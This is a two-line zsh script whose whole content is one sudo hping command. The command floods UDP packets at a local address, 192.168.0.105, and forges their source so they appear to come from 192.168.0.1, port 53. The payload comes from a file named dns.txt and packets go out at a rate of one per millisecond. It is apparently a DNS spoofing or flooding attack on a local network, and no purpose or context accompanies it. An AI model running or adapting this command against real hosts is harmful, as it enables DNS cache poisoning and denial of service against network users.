#!/bin/zsh
sudo hping 192.168.0.105 --udp -V --spoof 192.168.0.1 -s 53 -k -p 65535 --file dns.txt -d 44 -i u1000
